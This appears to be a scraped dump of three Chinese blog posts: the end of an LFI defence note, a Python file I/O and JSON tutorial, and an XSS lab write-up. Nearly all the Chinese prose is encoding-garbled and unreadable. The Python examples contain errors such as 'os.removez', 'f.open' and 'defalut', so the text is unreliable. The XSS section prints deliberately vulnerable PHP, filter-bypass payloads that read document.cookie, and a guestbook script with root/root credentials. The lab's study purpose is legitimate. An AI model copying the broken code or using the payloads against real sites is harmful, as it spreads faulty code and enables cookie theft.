ç»¼ä¸Šï¼Œè¦é˜²å¾¡LFIçš„æ¼æ´ï¼Œåº”è¯¥å°½é‡é¿å…åŒ…å«åŠ¨æ€çš„å˜é‡ï¼Œå°¤å…¶æ˜¯ç”¨æˆ·å¯ä»¥æ§åˆ¶çš„å˜é‡ã€‚ä¸€ç§å˜é€šçš„æ–¹å¼ï¼Œåˆ™æ˜¯ä½¿ç”¨æšä¸¾ï¼š 123456789101112131415&lt;?php $file = $_GET[&#x27;file&#x27;]; //whitelisting possible values switch($file) &#123; case &quot;main&quot;: case &quot;foo&quot;: case &quot;bar&quot;: include &quot;/home/wwwrun/include&quot; . $file . &quot;.php&quot;; break; default: include &quot;/home/wwwrun/include/main.php&quot;; &#125;?&gt; Reference ã€Šç™½å¸½å­è®²Webå®‰å…¨ã€‹ PHPæ–‡ä»¶åŒ…å« [LFIã€RFIã€PHPå°è£…åè®®å®‰å…¨é—®é¢˜å­¦ä¹  LFIä»¥åŠRFI(æ–‡ä»¶åŒ…å«)ä¼ªåè®®åˆ©ç”¨å°æŠ€å·§ LFIBoomCTF","tags":[{"name":"webå®‰å…¨åŸºç¡€","slug":"webå®‰å…¨åŸºç¡€","permalink":"http://ca0y1h.top/tags/web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"},{"name":"æ–‡ä»¶åŒ…å«","slug":"æ–‡ä»¶åŒ…å«","permalink":"http://ca0y1h.top/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"}],"categories":[{"name":"webå®‰å…¨","slug":"webå®‰å…¨","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/"},{"name":"åŸºç¡€å­¦ä¹ ","slug":"webå®‰å…¨/åŸºç¡€å­¦ä¹ ","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"PythonIOç¼–ç¨‹","date":"2019-11-11T00:58:27.000Z","path":"Python/code/6.PythonIOç¼–ç¨‹/","text":"PythonIOç¼–ç¨‹ ä¸»è¦è®°å½•Pythonçš„æ–‡ä»¶è¯»å†™ã€æ–‡ä»¶å’Œç›®å½•æ“ä½œä»¥åŠJSONåºåˆ—åŒ–ã€‚ æ–‡ä»¶è¯»å†™ æ‰€æœ‰æ¨¡å¼çš„å®šä¹‰åŠå«ä¹‰å¯ä»¥å‚è€ƒPythonçš„å®˜æ–¹æ–‡æ¡£ã€‚ è¯»æ–‡ä»¶ 123456try: f = open(&#x27;/path/to/file&#x27;, &#x27;r&#x27;) print(f.read())finally: if f: f.close() æ¯æ¬¡è¿™æ ·è¿‡äºç¹çï¼ŒPythonå¼•å…¥äº†withè¯­å¥è‡ªåŠ¨å¸®æˆ‘ä»¬è°ƒç”¨close()æ–¹æ³•ï¼š 12with open(&#x27;/path/to/file&#x27;, &#x27;r&#x27;) as f: print(f.read()) read()å‡½æ•°ä¼šä¸€æ¬¡æ€§è¯»å–æ–‡ä»¶çš„å…¨éƒ¨å†…å®¹ï¼Œå¦‚æœæ–‡ä»¶å¤ªå¤§ï¼ŒPythonç¨‹åºå°±ç›´æ¥æŒ‚æ‰äº†ï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨read(size)æ¥æŒ‡å®šæ¯æ¬¡æœ€å¤šè¯»å–sizeå­—èŠ‚çš„å†…å®¹ï¼Œæˆ–è€…ä½¿ç”¨readline()å’Œreadlines()ã€‚ ä¸€èˆ¬æ¥è¯´ï¼Œå¦‚æœæ–‡ä»¶è¾ƒå°ï¼Œç›´æ¥ä½¿ç”¨read()æ–¹æ³•ï¼›å¦‚æœä¸èƒ½ç¡®å®šæ–‡ä»¶å¤§å°ï¼Œå°±åå¤è°ƒç”¨read(size)æ–¹æ³•ï¼›å¦‚æœæ˜¯é…ç½®æ–‡ä»¶ï¼Œè°ƒç”¨readlines()æœ€æ–¹ä¾¿ï¼š 12for line in f.readlines(): print(line.strip()) # å»æ‰&#x27;\\n&#x27; åƒopen()å‡½æ•°è¿”å›çš„è¿™ç§æœ‰ä¸ªread()æ–¹æ³•çš„å¯¹è±¡ï¼Œåœ¨Pythonä¸­ç§°ä¸ºfile-like-objectã€‚é™¤äº†fileå¤–ï¼Œè¿˜å¯ä»¥æ˜¯å†…å­˜çš„å­—èŠ‚æµï¼Œç½‘ç»œæµï¼Œè‡ªå®šä¹‰æµã€‚ äºŒè¿›åˆ¶æ–‡ä»¶ 123&gt;&gt;&gt; f = open(&#x27;/User/xxx/test.jpg&#x27;, &#x27;rb&#x27;)&gt;&gt;&gt; f.read()b&#x27;\\xff\\xd8\\xff\\xe1\\x00\\x18Exif\\x00\\x00...&#x27; # åå…­è¿›åˆ¶è¡¨ç¤ºçš„å­—èŠ‚ å­—ç¬¦ç¼–ç  è¯»å–éUnicodeç¼–ç çš„æ–‡ä»¶ï¼š 1&gt;&gt;&gt; f = open(&#x27;/User/xxx/gbk.txt&#x27;, &#x27;r&#x27;, encoding=&#x27;gbk&#x27;) å¦‚æœé‡åˆ°ä¸€äº›ç¼–ç ä¸è§„èŒƒçš„æ–‡ä»¶ï¼Œopen()å‡½æ•°è¿˜æ¥æ”¶ä¸€ä¸ªerrorå‚æ•°ã€‚ 1&gt;&gt;&gt; f.open(&#x27;\\User\\xxx\\gbk.txt&#x27;, &#x27;r&#x27;, encoding=&#x27;gbk&#x27;, errors=&#x27;ignore&#x27;) å†™æ–‡ä»¶ 123&gt;&gt;&gt; f = open(&#x27;/User/xxx/test.txt&#x27;, &#x27;w&#x27;)&gt;&gt;&gt; f.write(&#x27;Hello, world!&#x27;)&gt;&gt;&gt; f.close() åªæœ‰è°ƒç”¨close()æ–¹æ³•æ—¶ï¼Œæ“ä½œç³»ç»Ÿæ‰ä¿è¯æŠŠæ²¡æœ‰å†™å…¥çš„æ•°æ®å…¨éƒ¨å†™å…¥ç£ç›˜ã€‚å¿˜è®°è°ƒç”¨close()çš„åæœæ˜¯æ•°æ®å¯èƒ½åªå†™äº†ä¸€éƒ¨åˆ†åˆ°ç£ç›˜ï¼Œå‰©ä¸‹çš„ä¸¢å¤±äº†ã€‚æ‰€ä»¥ï¼Œè¿˜æ˜¯ç”¨withè¯­å¥æ¥å¾—ä¿é™©ï¼š 12with open(&#x27;/User/xxx/test.txt&#x27;, &#x27;w&#x27;) as f: f.write(&#x27;Hello, world&#x27;) å¦‚æœæˆ‘ä»¬å¸Œæœ›è¿½åŠ åˆ°æ–‡ä»¶æœ«å°¾æ€ä¹ˆåŠï¼Ÿå¯ä»¥ä¼ å…¥'a'ä»¥è¿½åŠ ï¼ˆappendï¼‰æ¨¡å¼å†™å…¥ã€‚ StringIOå’ŒBytesIO StringIO å†™å…¥ 123456789&gt;&gt;&gt; f = StringIO()&gt;&gt;&gt; f. write(&#x27;Hello&#x27;)5&gt;&gt;&gt; f.write(&#x27; &#x27;)1&gt;&gt;&gt; f.write(&#x27;world!&#x27;)6&gt;&gt;&gt; print(f.getvalue())Hello world! getvalue()æ–¹æ³•ç”¨äºè·å¾—å†™å…¥åçš„strã€‚ è¯»å– è¦è¯»å–StringIOï¼Œå¯ä»¥ç”¨ä¸€ä¸ªstråˆå§‹åŒ–StringIOï¼Œç„¶ååƒè¯»å–æ–‡ä»¶ä¸€æ ·è¯»å–ï¼š 12345678910&gt;&gt;&gt; f = StringIO(&#x27;Hello!\\nHi!\\nGoogbye!&#x27;)&gt;&gt;&gt; while True:... s = f.readline()... if s == &#x27;&#x27;:... break... print(s.strip())... Hello!Hi!Googbye! BytesIO å†™å…¥ BytesIOå®ç°äº†åœ¨å†…å­˜ä¸­è¯»å†™bytesï¼Œæˆ‘ä»¬åˆ›å»ºä¸€ä¸ªBytesIOï¼Œç„¶åå†™å…¥ä¸€äº›bytesï¼š 123456&gt;&gt;&gt; from io import BytesIO&gt;&gt;&gt; f = BytesIO()&gt;&gt;&gt; f.write(&#x27;ä¸­æ–‡&#x27;.encode(&#x27;utf-8&#x27;))6&gt;&gt;&gt; print(f.getvalue())b&#x27;\\xe4\\xb8\\xad\\xe6\\x96\\x87&#x27; è¯·æ³¨æ„ï¼Œå†™å…¥çš„ä¸æ˜¯strï¼Œè€Œæ˜¯ç»è¿‡UTF-8ç¼–ç çš„bytesã€‚ è¯»å– å’ŒStringIOç±»ä¼¼ï¼Œå¯ä»¥ç”¨ä¸€ä¸ªbytesåˆå§‹åŒ–BytesIOï¼Œç„¶åï¼Œåƒè¯»æ–‡ä»¶ä¸€æ ·è¯»å–ï¼š 1234&gt;&gt;&gt; from io import BytesIO&gt;&gt;&gt; f = BytesIO(b&#x27;\\xe4\\xb8\\xad\\xe6\\x96\\x87&#x27;)&gt;&gt;&gt; f.read()b&#x27;\\xe4\\xb8\\xad\\xe6\\x96\\x87&#x27; æ“ä½œæ–‡ä»¶å’Œç›®å½• æ“ä½œç›®å½• 12345678# æŸ¥çœ‹å½“å‰ç›®å½•çš„ç»å¯¹è·¯å¾„&gt;&gt;&gt; os.path.abspath(.)# åœ¨æŸä¸ªç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªæ–°ç›®å½•ï¼Œé¦–å…ˆæŠŠæ–°ç›®å½•çš„å®Œæ•´è·¯å¾„è¡¨ç¤ºå‡ºæ¥&gt;&gt;&gt; os.path.join(&#x27;/Users/xxx&#x27;, &#x27;testdir&#x27;)# ç„¶ååˆ›å»ºä¸€ä¸ªç›®å½•&gt;&gt;&gt; os.mkdir(&#x27;/Users/xxx/testdir&#x27;)# åˆ æ‰ä¸€ä¸ªç›®å½•&gt;&gt;&gt; os.rmdir(&#x27;/Users/xxx/testdir&#x27;) æŠŠä¸¤ä¸ªè·¯å¾„åˆæˆä¸€ä¸ªæ—¶ï¼Œä¸è¦ç›´æ¥æ‹¼å­—ç¬¦ä¸²ï¼Œè€Œè¦é€šè¿‡os.path.join()å‡½æ•°ï¼Œè¿™æ ·å¯ä»¥æ­£ç¡®å¤„ç†ä¸åŒæ“ä½œç³»ç»Ÿçš„è·¯å¾„åˆ†éš”ç¬¦ã€‚ åŒæ ·çš„é“ç†ï¼Œè¦æ‹†åˆ†è·¯å¾„æ—¶ï¼Œä¹Ÿä¸è¦ç›´æ¥å»æ‹†å­—ç¬¦ä¸²ï¼Œè€Œè¦é€šè¿‡os.path.split()å‡½æ•°ï¼Œè¿™æ ·å¯ä»¥æŠŠä¸€ä¸ªè·¯å¾„æ‹†åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼Œåä¸€éƒ¨åˆ†æ€»æ˜¯æœ€åçº§åˆ«çš„ç›®å½•æˆ–æ–‡ä»¶åï¼š 12&gt;&gt;&gt; os.path.split(&#x27;/Users/xxx/testdir/test.txt&#x27;)(&#x27;/Users/xxx/testdir&#x27;, &#x27;test.txt&#x27;) os.path.splitext()å¯ä»¥ç›´æ¥å¾—åˆ°æ–‡ä»¶æ‰©å±•åï¼š 12&gt;&gt;&gt;os.path.splitext(&#x27;/Users/xxx/testdir/test.txt&#x27;)(&#x27;/Users/xxx/testdir/test&#x27;, &#x27;.txt&#x27;) æ“ä½œæ–‡ä»¶ å‡å®šå½“å‰ç›®å½•ä¸‹æœ‰ä¸€ä¸ªtest.txtæ–‡ä»¶ï¼š 1234# å¯¹æ–‡ä»¶é‡å‘½å&gt;&gt;&gt; os.rename(&#x27;test.txt&#x27;, &#x27;test.py&#x27;)# åˆ é™¤æ–‡ä»¶&gt;&gt;&gt; os.removez(&#x27;test.py&#x27;) Pythonçš„osæ¨¡å—æ²¡æœ‰æä¾›æ–‡ä»¶çš„å¤åˆ¶æ“ä½œï¼Œä½†æ˜¯åœ¨shutilæ¨¡å—æä¾›äº†å¾ˆå¤šä¸­ä¸åŒéœ€æ±‚çš„æ–‡ä»¶å¤åˆ¶æ“ä½œã€‚ shutil.copyfileobj(æ–‡ä»¶1ï¼Œæ–‡ä»¶2)ï¼šå°†æ–‡ä»¶1çš„æ•°æ®è¦†ç›–copyç»™æ–‡ä»¶2 1234567import shutilf1 = open(&quot;1.txt&quot;,encoding=&quot;utf-8&quot;)f2 = open(&quot;2.txt&quot;,&quot;w&quot;,encoding=&quot;utf-8&quot;)shutil.copyfileobj(f1,f2) shutil.copy(æ–‡ä»¶1ï¼Œæ–‡ä»¶2)ï¼šæ‹·è´æ–‡ä»¶å’Œæƒé™éƒ½è¿›è¡Œcopyã€‚ shutil.move(æºæ–‡ä»¶ï¼ŒæŒ‡å®šè·¯å¾„)ï¼šé€’å½’ç§»åŠ¨ä¸€ä¸ªæ–‡ä»¶ã€‚ shutil.copytree(æºç›®å½•ï¼Œç›®æ ‡ç›®å½•)ï¼šå¯ä»¥é€’å½’copyå¤šä¸ªç›®å½•åˆ°æŒ‡å®šç›®å½•ã€‚ è¿‡æ»¤æ–‡ä»¶ åˆ—å‡ºå½“å‰ç›®å½•ä¸‹çš„æ‰€æœ‰ç›®å½•ï¼š 1&gt;&gt;&gt; [x for x in os.listdir(&#x27;.&#x27;) if os.path.isdir(x)] åˆ—å‡ºæŒ‡å®šåç¼€åçš„æ–‡ä»¶ï¼š 1&gt;&gt;&gt; [x for x in os.listdir(&#x27;x&#x27;) if os.path.isfile(x) and os.path.splitext(x)[1] == &#x27;py&#x27;] åºåˆ—åŒ– Pythonæä¾›äº†pickleæ¨¡å—æ¥å®ç°åºåˆ—åŒ–ã€‚ é¦–å…ˆï¼ŒæŠŠä¸€ä¸ªå¯¹è±¡åºåˆ—åŒ–å¹¶å†™å…¥æ–‡ä»¶ï¼š 1234&gt;&gt;&gt; import pickle&gt;&gt;&gt; d = dict(name=&#x27;Bob&#x27;, age=20, score=88)&gt;&gt;&gt; pickle.dumps(d)b&#x27;\\x80\\x03&#125;q\\x00(X\\x03\\x00\\x00\\x00ageq\\x01K\\x14X\\x05\\x00\\x00\\x00scoreq\\x02KXX\\x04\\x00\\x00\\x00nameq\\x03X\\x03\\x00\\x00\\x00Bobq\\x04u.&#x27; pickle.dumps()æ–¹æ³•æŠŠä»»æ„å¯¹è±¡åºåˆ—åŒ–æˆä¸€ä¸ªbytesï¼Œç„¶åï¼Œå°±å¯ä»¥æŠŠè¿™ä¸ªbyteså†™å…¥æ–‡ä»¶ã€‚è¿˜æœ‰ä¸€ä¸ªpickle.dump()æ–¹æ³•ï¼Œå®ƒç›´æ¥æŠŠå¯¹è±¡åºåˆ—åŒ–åå†™å…¥ä¸€ä¸ªfile-like Objectï¼š 123&gt;&gt;&gt; f = open(&#x27;dump.txt&#x27;, &#x27;wb&#x27;)&gt;&gt;&gt; pickle.dump(d, f)&gt;&gt;&gt; f.close() å½“æˆ‘ä»¬è¦æŠŠå¯¹è±¡ä»ç£ç›˜è¯»åˆ°å†…å­˜æ—¶ï¼Œå¯ä»¥å…ˆæŠŠå†…å®¹è¯»åˆ°ä¸€ä¸ªbytesï¼Œç„¶åç”¨pickle.loads()æ–¹æ³•ååºåˆ—åŒ–å‡ºå¯¹è±¡ï¼Œä¹Ÿå¯ä»¥ç”¨pickle.load()æ–¹æ³•ç›´æ¥ä»ä¸€ä¸ªfile-like Objectä¸­ç›´æ¥ååºåˆ—åŒ–å‡ºå¯¹è±¡ã€‚ 12345&gt;&gt;&gt; f = open(&#x27;dump.txt&#x27;, &#x27;rb&#x27;)&gt;&gt;&gt; d = pickle.load(f)&gt;&gt;&gt; f.close()&gt;&gt;&gt; d&#123;&#x27;age&#x27;: 20, &#x27;score&#x27;: 88, &#x27;name&#x27;: &#x27;Bob&#x27;&#125; JSON JSONå’ŒPythonå†…ç½®çš„æ•°æ®ç±»å‹å¯¹åº”å¦‚ä¸‹ï¼š JSONç±»å‹ Pythonç±»å‹ {} dict [] list â€œstringâ€ str 1234.56 intæˆ–float true/false True/False null None Pythonå¯¹è±¡â€”&gt;JSONå¯¹è±¡ 1234&gt;&gt;&gt; import json&gt;&gt;&gt; d = dict(name=&#x27;Bob&#x27;, age=20, score=88)&gt;&gt;&gt; json.dumps(d)&#x27;&#123;&quot;age&quot;: 20, &quot;score&quot;: 88, &quot;name&quot;: &quot;Bob&quot;&#125;&#x27; dumps()æ–¹æ³•è¿”å›ä¸€ä¸ªstrï¼Œå†…å®¹å°±æ˜¯æ ‡å‡†çš„JSONã€‚ç±»ä¼¼çš„ï¼Œdump()æ–¹æ³•å¯ä»¥ç›´æ¥æŠŠJSONå†™å…¥ä¸€ä¸ªfile-like Objectã€‚ JSONå¯¹è±¡â€”&gt;Pythonå¯¹è±¡ è¦æŠŠJSONååºåˆ—åŒ–ä¸ºPythonå¯¹è±¡ï¼Œç”¨loads()æˆ–è€…å¯¹åº”çš„load()æ–¹æ³•ï¼Œå‰è€…æŠŠJSONçš„å­—ç¬¦ä¸²ååºåˆ—åŒ–ï¼Œåè€…ä»file-like Objectä¸­è¯»å–å­—ç¬¦ä¸²å¹¶ååºåˆ—åŒ–ï¼š 123&gt;&gt;&gt; json_str = &#x27;&#123;&quot;age&quot;: 20, &quot;score&quot;: 88, &quot;name&quot;: &quot;Bob&quot;&#125;&#x27;&gt;&gt;&gt; json.loads(json_str)&#123;&#x27;age&#x27;: 20, &#x27;score&#x27;: 88, &#x27;name&#x27;: &#x27;Bob&#x27;&#125; å¦‚æœæƒ³å¯¹ä¸€ä¸ªclasså¯¹è±¡è¿›è¡Œåºåˆ—åŒ–æ“ä½œï¼Œæˆ‘ä»¬åº”è¯¥æ€ä¹ˆåšå‘¢ï¼Ÿ https://docs.python.org/3/library/json.html#json.dumps å¯ä»¥çœ‹åˆ°å‚æ•°åˆ—è¡¨ä¸­dumps()çš„å‚æ•°åˆ—è¡¨æä¾›ä¸€ä¸ªdefaulté€‰é¡¹ã€‚ defalutï¼šTo use a custom JSONEncoder subclass (e.g. one that overrides the default() method to serialize additional types), specify it with the cls kwarg; otherwise JSONEncoder is used. ä¹Ÿå°±æ˜¯è¯´å¦‚æœè¦åºåˆ—åŒ–ä¸€ä¸ªclasså¯¹è±¡ï¼Œæˆ‘ä»¬å¿…é¡»è‡ªå·±å†™ä¸€ä¸ªåºåˆ—åŒ–çš„è¿‡ç¨‹ï¼Œä¸ç„¶Pythonæ˜¯ä¸çŸ¥é“å¦‚ä½•å¯¹ä¸€ä¸ªclasså¯¹è±¡è¿›è¡Œåºåˆ—åŒ–æ“ä½œçš„ã€‚ 123456789101112class Student(object): def __init__(self, name, age, score): self.name = name self.age = age self.score = score def student2dict(std): return &#123; &#x27;name&#x27;: std.name &#x27;age&#x27;: std.age &#x27;score&#x27;: std.score &#125; è¿™æ ·ï¼ŒStudentå®ä¾‹é¦–å…ˆè¢«student2dict()å‡½æ•°è½¬æ¢æˆdictï¼Œç„¶åå†è¢«åºåˆ—åŒ–ä¸ºJSONï¼š 123&gt;&gt;&gt; s = Student(&#x27;Bob&#x27;, 20, 88)&gt;&gt;&gt; print(json.dumps(s, defalut=student2dict))&#123;&quot;age&quot;: 20, &quot;name&quot;: &quot;Bob&quot;, &quot;score&quot;: 88&#125; ä½†æ˜¯ä¸ºæ¯ä¸€ä¸ªclasså†™ä¸€ä¸ªç±»ä¼¼è½¬åŒ–å‡½æ•°æœªå…ä»£ç çš„é‡å¤ç‡æœ‰ç‚¹å¤ªé«˜ã€‚ 1print(json.dumps(s, default=lambda obj: obj.__dict__)) é€šå¸¸classçš„å®ä¾‹éƒ½æœ‰ä¸€ä¸ª__dict__å±æ€§ï¼Œå®ƒå°±æ˜¯ä¸€ä¸ªdictï¼Œç”¨æ¥å­˜å‚¨å®ä¾‹å˜é‡ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥ä½¿ç”¨__dict__å±æ€§ã€‚ å¦‚æœæˆ‘ä»¬è¦æŠŠJSONååºåˆ—åŒ–ä¸ºä¸€ä¸ªStudentå¯¹è±¡å®ä¾‹ï¼Œloads()æ–¹æ³•é¦–å…ˆè½¬æ¢å‡ºä¸€ä¸ªdictå¯¹è±¡ï¼Œç„¶åï¼Œæˆ‘ä»¬ä¼ å…¥çš„object_hookå‡½æ•°è´Ÿè´£æŠŠdictè½¬æ¢ä¸ºStudentå®ä¾‹ï¼š 12def dict2student(d): return Student(d[&#x27;name&#x27;], d[&#x27;age&#x27;], d[&#x27;score&#x27;]) ç»“æœå¦‚ä¸‹ï¼š 123&gt;&gt;&gt; json_str = &#x27;&#123;&quot;age&quot;: 20, &quot;score&quot;: 88, &quot;name&quot;: &quot;Bob&quot;&#125;&#x27;&gt;&gt;&gt; print(json.loads(json_str, object_hook=dict2student))&lt;__main__.Student object at 0x10cd3c190&gt;","tags":[{"name":"python","slug":"python","permalink":"http://ca0y1h.top/tags/python/"},{"name":"IOç¼–ç¨‹","slug":"IOç¼–ç¨‹","permalink":"http://ca0y1h.top/tags/IO%E7%BC%96%E7%A8%8B/"}],"categories":[{"name":"ç¼–ç¨‹","slug":"ç¼–ç¨‹","permalink":"http://ca0y1h.top/categories/%E7%BC%96%E7%A8%8B/"},{"name":"python","slug":"ç¼–ç¨‹/python","permalink":"http://ca0y1h.top/categories/%E7%BC%96%E7%A8%8B/python/"}]},{"title":"Webå®‰å…¨å­¦ä¹ ä¹‹XSSæ¼æ´å®æˆ˜å­¦ä¹ ","date":"2019-11-09T08:16:21.000Z","path":"Web_security/basic_learning/12.XSSæ¼æ´å®æˆ˜å­¦ä¹ /","text":"Webå®‰å…¨å­¦ä¹ ä¹‹XSSæ¼æ´å®æˆ˜å­¦ä¹  ç¼–å†™ä¸€ä¸ªå­˜åœ¨ xss æ¼æ´çš„é¡µé¢ åˆ©ç”¨ xss æ¼æ´è·å–å½“å‰ç”¨æˆ· cookie æ€è€ƒï¼Œåˆ©ç”¨ xss æ¼æ´èƒ½å¹²å˜›ï¼ˆå‚è€ƒ beefï¼‰ æ‰©å±•å­¦ä¹ ï¼šå­¦ä¹ å¦‚ä½•é˜²å¾¡ xssã€æ€»ç»“é˜²å¾¡ç­–ç•¥åŠ åˆ°æŠ¥å‘Šé‡Œ è¦æ±‚ï¼šè®°å½•ç¼–å†™çš„é¡µé¢ä»£ç ã€æ“ä½œæµç¨‹ã€æ€è€ƒæ€»ç»“ 0x01 XSSæ¼æ´ XSS(Cross Site Scripting)è·¨ç«™è„šæœ¬æ”»å‡»ï¼Œä¹Ÿæ˜¯ä¸€ç§æ³¨å…¥æ”»å‡»ï¼Œå½“webåº”ç”¨å¯¹ç”¨æˆ·è¾“å…¥è¿‡æ»¤ä¸ä¸¥æ ¼ï¼Œæ”»å‡»è€…å†™å…¥æ¶æ„çš„è„šæœ¬ä»£ç ï¼ˆHTMLã€JavaScriptï¼‰åˆ°ç½‘é¡µä¸­æ—¶ï¼Œå¦‚æœç”¨æˆ·è®¿é—®äº†å«æœ‰æ¶æ„ä»£ç çš„é¡µé¢ï¼Œæ¶æ„è„šæœ¬å°±ä¼šè¢«æµè§ˆå™¨è§£ææ‰§è¡Œå¯¼è‡´ç”¨æˆ·è¢«æ”»å‡»ã€‚ å¸¸è§çš„å±å®³æœ‰ï¼šcookieçªƒå–ï¼ŒsessionåŠ«æŒï¼Œé’“é±¼æ”»å‡»ï¼Œè •è™«ï¼Œddosç­‰ã€‚ 0x02 XSSæ¼æ´åˆ†ç±»å’Œä»£ç æ¡ˆä¾‹ åå°„å‹XSS åŸç† åå°„å‹xssä¸€èˆ¬å‡ºç°åœ¨URLå‚æ•°ä¸­åŠç½‘ç«™æœç´¢æ ä¸­ï¼Œç”±äºéœ€è¦ç‚¹å‡»åŒ…å«æ¶æ„ä»£ç çš„URLæ‰å¯ä»¥è§¦å‘ï¼Œå¹¶ä¸”åªèƒ½è§¦å‘ä¸€æ¬¡ï¼Œæ‰€ä»¥ä¹Ÿè¢«ç§°â€éæŒä¹…æ€§xssâ€ã€‚ ä»£ç æ¡ˆä¾‹ Low Level æ¼æ´ä»£ç ï¼š 123456789&lt;?php // Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123; // Feedback for end user echo &#x27;&lt;pre&gt;Hello &#x27; . $_GET[ &#x27;name&#x27; ] . &#x27;&lt;/pre&gt;&#x27;;&#125;setcookie(&quot;Cookie&quot;, &quot;Test&quot;);?&gt; æ¼æ´åˆ©ç”¨ï¼š Medium Level æ¼æ´ä»£ç ï¼š 12345678910&lt;?phpif (array_key_exists(&quot;name&quot;, $_GET) &amp;&amp; $_GET[&#39;name&#39;] !&#x3D; NULL) &#123; $name &#x3D; str_replace(&#39;&lt;script&gt;&#39;, &#39;&#39;, $_GET[&#39;name&#39;]); echo &quot;&lt;pre&gt;Hello &#123;$name&#125;&lt;&#x2F;pre&gt;&quot;;&#125;setcookie(&quot;Medium&quot;, &quot;CookieTest&quot;);?&gt; æ¼æ´åˆ©ç”¨ï¼š åŒå†™&lt;script&gt;æ ‡ç­¾ï¼š&lt;s&lt;script&gt;cript&gt; æ ‡ç­¾è½¬æ¢å¤§å°å†™ï¼š&lt;SCRipt&gt; High Level æ¼æ´ä»£ç ï¼š 123456789101112&lt;?php &#x2F;&#x2F; Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] !&#x3D; NULL ) &#123; &#x2F;&#x2F; Get input $name &#x3D; preg_replace( &#39;&#x2F;&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t&#x2F;i&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] ); &#x2F;&#x2F; Feedback for end user echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;&#x2F;pre&gt;&quot;;&#125; ?&gt; æ¼æ´åˆ©ç”¨ï¼š è¿™é‡Œä½¿ç”¨äº†æ­£åˆ™è¡¨è¾¾å¼è¿‡æ»¤äº†&lt;script&gt;æ ‡ç­¾ï¼Œ è¿™æ—¶å€™ä¸è®ºæ˜¯å¤§å°å†™ã€åŒå±‚&lt;script&gt;éƒ½æ— æ³•ç»•è¿‡ï¼Œæ­¤æ—¶å¯ä»¥ä½¿ç”¨åˆ«çš„æ ‡ç­¾ï¼Œæ¯”å¦‚&lt;img&gt;ã€‚ payloadï¼š &lt;img src=0 onerror=alert(document.cookie)&gt; å­˜å‚¨å‹XSS åŸç† å…è®¸ç”¨æˆ·æäº¤æ•°æ®çš„Webåº”ç”¨ç¨‹åºéƒ½æœ‰å¯èƒ½ä¼šå‡ºç°å­˜å‚¨å‹XSSæ¼æ´ï¼Œå½“æ”»å‡»è€…æäº¤ä¸€æ®µXSSä»£ç åï¼Œè¢«æœåŠ¡å™¨æ¥æ”¶å¹¶å­˜å‚¨ï¼Œå½“æ”»å‡»è€…å†æ¬¡è®¿é—®æŸä¸ªé¡µé¢æ—¶ï¼Œè¿™æ®µXSSä»£ç è¢«ç¨‹åºè¯»å‡ºæ¥å“åº”ç»™æµè§ˆå™¨ï¼Œé€ æˆXSSè·¨ç«™æ”»å‡»ï¼Œè¿™å°±æ˜¯å­˜å‚¨å‹XSSã€‚ ä»£ç æ¡ˆä¾‹ Low Level å‰ç«¯é¡µé¢ä»£ç ï¼š 123456789101112131415161718&lt;form method=&quot;post&quot; name=&quot;guestform&quot; action=&quot;low.php&quot;&gt; &lt;table width=&quot;550&quot; border=&quot;0&quot; cellpadding=&quot;2&quot; cellspacing=&quot;1&quot;&gt; &lt;tr&gt; &lt;td width=&quot;100&quot;&gt;Name *&lt;/td&gt; &lt;td&gt; &lt;input name=&quot;txtName&quot; type=&quot;text&quot; size=&quot;30&quot; maxlength=&quot;10&quot;&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td width=&quot;100&quot;&gt;Message *&lt;/td&gt; &lt;td&gt; &lt;textarea name=&quot;mtxMessage&quot; cols=&quot;50&quot; rows=&quot;3&quot; maxlength=&quot;50&quot;&gt;&lt;/textarea&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td width=&quot;100&quot;&gt;&amp;nbsp;&lt;/td&gt; &lt;td&gt; &lt;input name=&quot;btnSign&quot; type=&quot;submit&quot; value=&quot;Sign Guestbook&quot;&gt;&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt;&lt;/form&gt; æœåŠ¡å™¨ç«¯ä»£ç ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;?phperror_reporting(E_ALL);if(isset($_POST[&#x27;btnSign&#x27;]))&#123; $servername = &quot;localhost&quot;; $username = &quot;root&quot;; $password = &quot;root&quot;; $dbname = &quot;security&quot;; // åˆ›å»ºè¿æ¥ $conn = new mysqli($servername, $username, $password, $dbname); // æ£€æµ‹è¿æ¥ if ($conn-&gt;connect_error) &#123; die(&quot;æ•°æ®åº“è¿æ¥å¤±è´¥: &quot; . $conn-&gt;connect_error); &#125; else echo &quot;æ•°æ®åº“è¿æ¥æˆåŠŸ&quot;; echo &quot;&lt;hr&gt;&quot;; echo $_POST[&#x27;mtxMessage&#x27;]; $message = trim( $_POST[ &#x27;mtxMessage&#x27; ] ); $name = trim( $_POST[ &#x27;txtName&#x27; ] ); $message = stripslashes( $message ); $message = mysqli_real_escape_string( $message ); $name = mysqli_real_escape_string( $name ); $sql = &quot;INSERT INTO guestbook (comment,name) VALUES (&#x27;$message&#x27;,&#x27;$name&#x27;);&quot;; echo &quot;SQLæ’å…¥è¯­å¥ï¼š&quot;.$sql; echo &quot;&lt;hr&gt;&quot;; if ($conn-&gt;query($sql) === TRUE) &#123; echo &quot;æ–°è®°å½•æ’å…¥æˆåŠŸ&quot;; &#125; else &#123; echo &quot;Error: &quot; . $sql . &quot;&lt;br&gt;&quot; . $conn-&gt;error; &#125; $conn-&gt;close();&#125;?&gt; ç›¸å…³å‡½æ•°ä»‹ç»ï¼š 